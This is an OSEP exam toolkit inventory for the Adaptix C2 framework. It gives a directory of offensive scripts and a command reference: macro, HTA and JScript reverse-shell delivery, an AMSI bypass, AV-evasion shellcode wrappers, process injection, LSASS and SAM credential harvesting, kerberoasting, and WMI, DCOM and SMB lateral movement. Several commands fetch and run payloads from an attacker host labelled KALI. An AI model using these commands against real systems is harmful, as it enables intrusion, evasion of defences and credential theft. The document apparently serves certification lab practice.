# OSEP Exam Toolkit — Master Inventory
# C2: Adaptix C2

## Directory Structure
```
osep/
├── INVENTORY.md
├── gen_encoded_macro.py              ← VBA payload generator (any shellcode/cmd)
├── shells/
│   ├── ps_revshell.ps1               ← PS TCP shell with retry + logging
│   ├── hta_revshell.hta              ← HTA/mshta delivery
│   ├── js_revshell.js                ← JScript (cscript/wscript/rundll32)
│   └── macro_revshell_reliable.vba   ← Word macro (reliable, multi-hook)
├── injection/
│   ├── shellcode_runner.ps1          ← Local VirtualAlloc+CreateThread runner
│   └── process_inject.ps1            ← Remote OpenProcess+WriteProcessMemory+CRT
├── lateral/
│   ├── wmi_lateral.ps1               ← WMI Win32_Process.Create
│   ├── dcom_lateral.ps1              ← DCOM MMC20/ShellWindows/ShellBrowserWindow
│   └── smb_lateral.ps1               ← SCM service create (PsExec-style)
├── creds/
│   └── cred_harvest.ps1              ← LSASS minidump, SAM hives, vault, clipboard
├── ad/
│   ├── ad_enum.ps1                   ← LDAP enum: users/computers/groups/SPNs/trusts
│   └── kerberoast.ps1                ← Raw .NET TGS request → hashcat format
├── evasion/
│   ├── amsi_bypass.ps1               ← Split-string reflection bypass (PS3+)
│   └── av_evasion.py                 ← XOR/RC4 shellcode wrapper → PS runner stub
├── utils/
│   ├── file_transfer.ps1             ← IWR/WebClient/BITS/certutil with fallback
│   ├── port_scan.ps1                 ← Threaded TCP scanner, CIDR support
│   └── invoke_encode.py              ← b64/ps1b64/xor/hex encoder
└── listeners/
    └── setup_listeners.sh            ← Kali listener cheatsheet + nc launcher
```

## Adaptix C2 Workflow (primary C2)
```
1. Start Adaptix server on Kali
2. Listeners → New → HTTPS (or TCP raw)
3. Agents → Generate → Raw Binary → adaptix_agent.bin
4. Encrypt agent:
   python3 evasion/av_evasion.py rc4 "YourKey" adaptix_agent.bin runner.ps1
5. Deliver runner.ps1 via any delivery vector below
```

## Delivery Vectors
| Method          | Command / File                             | Notes |
|-----------------|--------------------------------------------|-------|
| Word macro      | `macro_revshell_reliable.vba` or `gen_encoded_macro.py` | `.doc` triggers without second prompt |
| HTA             | `shells/hta_revshell.hta`                  | `mshta http://KALI/hta_revshell.hta` |
| JScript         | `shells/js_revshell.js`                    | `cscript`, `wscript`, or `rundll32` LOLBIN |
| PS direct       | `shells/ps_revshell.ps1`                   | Dot-source + `Invoke-RevShell` |
| Encrypted stub  | `av_evasion.py` output                     | `powershell -ep bypass -nop -f runner.ps1` |

## Quick Command Reference
```powershell
# AMSI off first (always)
. .\evasion\amsi_bypass.ps1; Bypass-AMSI

# Shellcode (Adaptix agent)
. .\injection\shellcode_runner.ps1
$buf = [IO.File]::ReadAllBytes("adaptix_agent.bin")
Invoke-ShellcodeRunner -Shellcode $buf

# Inject into process
. .\injection\process_inject.ps1
Invoke-ProcessInject -TargetProcess explorer -Shellcode $buf

# Lateral — WMI
. .\lateral\wmi_lateral.ps1
Invoke-WMILateral -target 10.10.10.5 -user 'CORP\admin' -pass 'P@ss' -cmd 'powershell -ep bypass -nop -f \\KALI\share\runner.ps1'

# Lateral — DCOM
. .\lateral\dcom_lateral.ps1
Invoke-DCOMLateral -target 10.10.10.5 -cmd 'powershell -ep bypass -nop -f \\KALI\share\runner.ps1'

# Lateral — SMB/SCM
. .\lateral\smb_lateral.ps1
Invoke-SMBLateral -target 10.10.10.5 -user admin -pass 'P@ss' -cmd 'powershell -ep bypass -enc <B64>'

# Creds
. .\creds\cred_harvest.ps1; Invoke-CredHarvest

# AD enum
. .\ad\ad_enum.ps1; Invoke-ADEnum

# Kerberoast
. .\ad\kerberoast.ps1; Invoke-Kerberoast

# Port scan
. .\utils\port_scan.ps1
Invoke-PortScan -target 10.10.10.0/24 -ports 22,80,445,3389,5985

# File transfer
. .\utils\file_transfer.ps1
Get-RemoteFile -url http://KALI/runner.ps1 -out C:\Windows\Temp\r.ps1

# Encode payload
python3 utils/invoke_encode.py ps1b64 payload.ps1
```

## Log File
All scripts log to: `C:\Windows\Temp\osep_log.txt`
```powershell
Get-Content C:\Windows\Temp\osep_log.txt -Wait   # live tail on target
```
```bash
# Kali: if you have a shell
tail -f /mnt/.../osep_log.txt
```

## Kali Listeners
```bash
rlwrap nc -lvnp 443                              # raw shell fallback
python3 -m http.server 80                        # file server
python3 -m uploadserver 8080                     # receive uploads (pip install uploadserver)
```
